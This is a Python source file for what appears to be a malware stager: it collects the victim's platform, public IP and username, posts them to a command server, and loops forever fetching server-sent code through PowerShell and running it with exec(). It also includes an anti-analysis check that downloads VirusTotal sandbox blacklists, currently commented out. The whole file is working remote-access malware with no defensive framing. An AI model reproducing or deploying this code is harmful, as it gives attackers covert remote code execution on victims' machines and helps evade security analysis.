import requests
import platform,os,subprocess,json

class Stager:
	def __init__(self,Id,url):
		self.id = Id
		self.url = url
		self.data = {'ID':self.id,
		"pc": platform.platform(),
		"ip": requests.get("https://api.ipify.org/").content.strip().decode(),
		"user":os.getlogin()}
		self.internet = self.checkInternet()

	def checkInternet(self):
		try:
		    request = requests.get("https://www.google.com",timeout=6)
		    return True
		except (requests.ConnectionError,
		        requests.Timeout) as exception:
		    print(False)
		    return False

	def postRequests(self,firsttime=False):
		if firsttime:
			self.data["VirusTotal"] = False#self.checkVT()
		if self.internet:
			r = requests.post(self.url,self.data)
			print("[Requst Posted]")
		else:
			pass

	def checkVT(self):
		ip = self.data['ip']
		user = self.data['user']
		iplist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt").content.decode().split("\n")
		userlist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/.txt").content.decode().split("\n")
		if ip in iplist or user in userlist: 
			return True

		else:
			return False

	def getcommand(self):
		cmd = subprocess.check_output(['Powershell.exe','Invoke-WebRequest','-Uri',self.url,"-UseBasicParsing",'| Select-Object -Expand Content'],shell=True,stderr=True).decode("utf-8")
		raw_data = json.loads(cmd)
		if self.id in raw_data:
			command = raw_data[self.id]
			return command
		else:
			return "false"
		
	def Loader(self):
		cmd = []
		while True:
			ncmd = self.getcommand().split("||:||")
			if cmd != ncmd:
				command = ncmd
				if not command[0] == "":
					print(command[1])
					self.executer(command)
			else:
				pass
			cmd = ncmd
	def executer(self,command):
		ID = self.id
		URL = self.url
		DATA = self.data
		exec(command[1],{"ID":ID,"URL":URL,"DATA":DATA,"COMMAND":command})


	def executeall(self):
		self.postRequests(True)
		#if self.checkVT():
			#exit()
		self.Loader()



URL = "http://127.0.0.1:105/ReadForm"
a = Stager("TUT1",URL)
a.executeall()

